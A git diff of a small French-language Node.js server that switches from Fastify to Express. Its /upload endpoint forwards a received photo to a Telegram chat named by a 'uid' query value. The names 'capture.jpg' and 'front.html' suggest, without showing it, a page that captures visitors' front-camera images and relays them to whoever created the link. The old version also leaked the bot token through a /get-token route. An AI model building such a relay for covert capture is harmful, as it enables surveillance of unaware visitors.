@@ -1,60 +1,49 @@
 require("dotenv").config();
+const express = require("express");
+const multer = require("multer");
 const path = require("path");
-const fs = require("fs");
-const fastify = require("fastify")({ logger: false });
-const multer = require("fastify-multer");
 const fetch = require("node-fetch");
 const FormData = require("form-data");
 
-const upload = multer.memoryStorage();
-fastify.register(multer.contentParser);
-fastify.register(multer, { storage: upload });
+const app = express();
+const upload = multer();
 
-// Sert les fichiers statiques du dossier "public"
-fastify.register(require('@fastify/static'), {
-  root: path.join(__dirname, 'public'),
+app.use(express.static(path.join(__dirname, "public")));
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-const botToken = process.env.BOT_TOKEN;
+app.get("/front", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "front.html"));
+});
 
-fastify.post("/upload", async (req, reply) => {
-  const data = await req.file();
+app.post("/upload", upload.single("photo"), async (req, res) => {
+  const uid = req.query.uid || "0000";
+  const photo = req.file;
 
-  if (!data) {
-    return reply.status(400).send({ error: "Aucune image reçue." });
-  }
-
-  const { uid } = req.query;
-  if (!uid || !botToken) {
-    return reply.status(400).send({ error: "UID ou token manquant." });
+  if (!photo) {
+    return res.status(400).send("Aucune photo reçue");
   }
 
   const form = new FormData();
   form.append("chat_id", uid);
-  form.append("photo", data.file, { filename: "capture.jpg" });
-
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+  form.append("photo", photo.buffer, {
+    filename: photo.originalname,
+    contentType: photo.mimetype,
+  });
 
   try {
-    const response = await fetch(telegramUrl, {
+    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: form,
     });
-
-    const json = await response.json();
-    reply.send(json);
+    res.sendStatus(200);
   } catch (err) {
     console.error("Erreur Telegram:", err);
-    reply.status(500).send({ error: "Erreur lors de l'envoi à Telegram." });
+    res.sendStatus(500);
   }
 });
 
-// Route pour donner le token à la page HTML
-fastify.get("/get-token", async (req, reply) => {
-  reply.send({ token: process.env.BOT_TOKEN });
-});
-
-fastify.listen({ port: process.env.PORT || 3000 }, (err) => {
-  if (err) throw err;
-  console.log("Serveur démarré sur le port 3000");
-});
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Serveur lancé sur le port ${PORT}`));
